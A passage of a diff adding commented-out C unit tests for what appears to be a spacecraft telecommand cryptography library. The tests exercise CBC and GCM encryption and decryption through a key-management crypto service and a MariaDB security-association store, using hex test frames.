+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 6, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t return_val = Crypto_Init();
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* raw_tc_sdls_ping_h =
+//     "20031BE0000080d2c70008197f0b003100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b1fed255";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     SaInterface sa_if = get_sa_interface_inmemory();
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     SecurityAssociation_t* test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     // Expose the SADB Security Association for test edits.
+//     sa_if->sa_get_from_spi(1, &test_association);
+//     test_association->sa_state = SA_NONE;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     test_association->sa_state = SA_OPERATIONAL;
+//     test_association->ast = 0;
+//     test_association->arsn_len = 0;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+// }
+
+// /**
+//  * @brief Unit Test: Encryption CBC MDB KMC
+//  *                      Frame is 1 byte too large for this test.  Any encrypted data of length greater than 1007
+//  bytes,
+//  *                      will cause frame length exception.
+//  **/
+// UTEST(TC_APPLY_SECURITY, ENC_CBC_MDB_KMC_FRAME_TOO_BIG)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1,
+//     TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x0003, 2, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t return_val = Crypto_Init(); ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* raw_tc_sdls_ping_h =
+//     "200303F2000080d2c70008197f0b003100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b1fed255";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     SaInterface sa_if = get_sa_interface_inmemory();
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     SecurityAssociation_t* test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     // Expose the SADB Security Association for test edits.
+//     sa_if->sa_get_from_spi(1, &test_association);
+//     test_association->sa_state = SA_NONE;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     test_association->sa_state = SA_OPERATIONAL;
+//     test_association->ast = 0;
+//     test_association->arsn_len = 0;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_SIZE_EXCEEDS_MANAGED_PARAM_MAX_LIMIT, return_val);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Encryption CBC MDB KMC, Null IV
+//  **/
+// UTEST(TC_APPLY_SECURITY, ENC_CBC_MDB_KMC_NULL_IV)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_CRYPTO_MODULE, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL);
+
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 4, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t return_val = Crypto_Init(); ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* raw_tc_sdls_ping_h = "20031015000080d2c70008197f0b00310000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+// }
+
+// //******************************************************* Decryption Tests
+// *******************************************************//
+
+// /**
+//  * @brief Unit Test: Nominal Decryption CBC KMC
+//  **/
+// UTEST(TC_PROCESS, HAPPY_PATH_DECRYPT_CBC_KMC)
+// {
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1,
+//     TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x0003, 2, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     TC_t* tc_sdls_processed_frame;
+//     tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+//     memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));
+//     char* test_frame_pt_h = "2003002A0000000B00000000000000000000000000000000025364F9BC3344AF359DA06CA886746F59A0AB";
+//     //char* test_frame_pt_h = "2003001A0000000B025364F9BC3344AF359DA06CA886746F591C8E";
+//     uint8_t *test_frame_pt_b = NULL;
+//     int test_frame_pt_len = 0;
+
+//     // Expose/setup SAs for testing
+//     SecurityAssociation_t* test_association = NULL;
+//     test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     test_association->arsn_len = 0;
+//     test_association->shsnf_len = 0;
+//     test_association->ast = 0;
+//     test_association->stmacf_len = 0;
+//     test_association->sa_state = SA_OPERATIONAL;
+
+//     // Convert input test frame
+//     hex_conversion(test_frame_pt_h, (char**) &test_frame_pt_b, &test_frame_pt_len);
+
+//     status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);
+
+//     char* truth_data_h = "80d2c70008197f0b00310000b1fe";
+//     uint8_t* truth_data_b = NULL;
+//     int truth_data_l = 0;
+
+//     hex_conversion(truth_data_h, (char**) &truth_data_b, &truth_data_l);
+//     //printf("Decrypted Frame:\n");
+//     for(int i = 0; i < tc_sdls_processed_frame->tc_pdu_len; i++)
+//     {
+//         //printf("%02x -> %02x ", tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//         ASSERT_EQ(tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//     }
+//     //printf("\n");
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     free(test_frame_pt_b);
+//     Crypto_Shutdown();
+// }
+
+// /**
+//  * @brief Unit Test: Decryption CBC KMC with 1 Byte of padding
+//  **/
+// UTEST(TC_PROCESS, DECRYPT_CBC_KMC_1B)
+// {
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1,
+//     TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x0003, 2, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     TC_t* tc_sdls_processed_frame;
+//     tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+//     memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));
+
+//     char* test_frame_pt_h = "2003002A0000000B00000000000000000000000000000000011C1741A95DE7EF6FCF2B20B6F09E9FD29988";
+//     uint8_t *test_frame_pt_b = NULL;
+//     int test_frame_pt_len = 0;
+
+//     // Expose/setup SAs for testing
+//     SecurityAssociation_t* test_association = NULL;
+//     test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     test_association->arsn_len = 0;
+//     test_association->shsnf_len = 0;
+//     test_association->ast = 0;
+//     test_association->stmacf_len = 0;
+//     test_association->sa_state = SA_OPERATIONAL;
+
+//     // Convert input test frame
+//     hex_conversion(test_frame_pt_h, (char**) &test_frame_pt_b, &test_frame_pt_len);
+
+//     status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);
+
+//     char* truth_data_h = "80d2c70008197f0b0031000000b1fe";
+//     uint8_t* truth_data_b = NULL;
+//     int truth_data_l = 0;
+
+//     hex_conversion(truth_data_h, (char**) &truth_data_b, &truth_data_l);
+//     //printf("Decrypted Frame:\n");
+//     for(int i = 0; i < tc_sdls_processed_frame->tc_pdu_len; i++)
+//     {
+//         //printf("%02x -> %02x ", tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//         ASSERT_EQ(tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//     }
+//     //printf("\n");
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     free(test_frame_pt_b);
+//     Crypto_Shutdown();
+// }
+
+// /**
+//  * @brief Unit Test: Decryption CBC KMC with 16 Bytes of padding
+//  **/
+// UTEST(TC_PROCESS, DECRYPT_CBC_KMC_16B)
+// {
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1,
+//     TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x0003, 2, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     TC_t* tc_sdls_processed_frame;
+//     tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+//     memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));
+
+//     char* test_frame_pt_h =
+//     "2003003A0000000B00000000000000000000000000000000103970EAE4C05ACD1B0C348FDA174DF73EF0E2D603996C4B78B992CD60918729D3A47A";
+//     uint8_t *test_frame_pt_b = NULL;
+//     int test_frame_pt_len = 0;
+
+//     // Expose/setup SAs for testing
+//     SecurityAssociation_t* test_association = NULL;
+//     test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     test_association->arsn_len = 0;
+//     test_association->shsnf_len = 0;
+//     test_association->ast = 0;
+//     test_association->stmacf_len = 0;
+//     test_association->sa_state = SA_OPERATIONAL;
+
+//     // Convert input test frame
+//     hex_conversion(test_frame_pt_h, (char**) &test_frame_pt_b, &test_frame_pt_len);
+
+//     status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);
+
+//     char* truth_data_h = "80d2c70008197f0b003100000000b1fe";
+//     uint8_t* truth_data_b = NULL;
+//     int truth_data_l = 0;
+
+//     hex_conversion(truth_data_h, (char**) &truth_data_b, &truth_data_l);
+//     //printf("Decrypted Frame:\n");
+//     for(int i = 0; i < tc_sdls_processed_frame->tc_pdu_len; i++)
+//     {
+//         //printf("%02x -> %02x ", tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//         ASSERT_EQ(tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//     }
+//     //printf("\n");
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     free(test_frame_pt_b);
+//     Crypto_Shutdown();
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Decryption CBC KMC, Null IV
+//  **/
+// UTEST(TC_PROCESS, DECRYPT_CBC_KMC_NULL_IV)
+// {
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_CRYPTO_MODULE, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_FALSE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     TC_t* tc_sdls_processed_frame;
+//     tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+//     memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));
+
+//     char* test_frame_pt_h = "2003002A0000000B22BA7A6B53C17DD9405B599FB04222A7026AC591A28602BF97D3E7D9CE6BC52D4382EB";
+//     uint8_t *test_frame_pt_b = NULL;
+//     int test_frame_pt_len = 0;
+
+//     // Expose/setup SAs for testing
+//     SecurityAssociation_t* test_association = NULL;
+//     test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     test_association->sa_state = SA_OPERATIONAL;
+//     test_association->ast = 0;
+
+//     // Convert input test frame
+//     hex_conversion(test_frame_pt_h, (char**) &test_frame_pt_b, &test_frame_pt_len);
+//     status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     free(test_frame_pt_b);
+//     Crypto_Shutdown();
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Encryption CBC KMC, with no supplied IV
+//  **/
+// UTEST(TC_PROCESS, DECRYPT_GCM_KMC_NULL_IV)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_CRYPTO_MODULE, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t return_val = Crypto_Init();
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     TC_t* tc_sdls_processed_frame;
+//     tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+//     memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));
+
+//     char* raw_tc_sdls_ping_h =
+//     "200300330000000B5C7D0E687B4ACC8978CEB8F9F1713AC7E65FAA6845BF9607A6D2B89B7AF55C4463B9068F344242AAFAEBE298";
+//     uint8_t* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     SaInterface sa_if = get_sa_interface_inmemory();
+
+//     hex_conversion(raw_tc_sdls_ping_h, (char **) &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     SecurityAssociation_t* test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     // Expose the SADB Security Association for test edits.
+//     sa_if->sa_get_from_spi(1, &test_association);
+//     test_association->sa_state = SA_NONE;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     printf("SPI: %d\n", test_association->spi);
+//     test_association->sa_state = SA_OPERATIONAL;
+//     test_association->ast = 1;
+//     test_association->est = 1;
+//     test_association->stmacf_len = 16;
+//     test_association->shplf_len = 0;
+//     test_association->ecs = CRYPTO_CIPHER_AES256_GCM;
+//     test_association->acs_len = 1;
+//     test_association->acs = 0;
+//     test_association->arsn_len = 0;
+//     test_association->iv_len = 12;
+//     test_association->shivf_len = 12;
+//     return_val = Crypto_TC_ProcessSecurity(raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len, tc_sdls_processed_frame);
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+// }
+
+// // *************************************** Decryption + MDB ***********************************************//
+// /**
+//  * @brief Unit Test: Nominal Decryption CBC MDB KMC
+//  **/
+// UTEST(TC_PROCESS, HAPPY_PATH_DECRYPT_CBC_MDB_KMC)
+// {
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 6, TC_HAS_FECF,
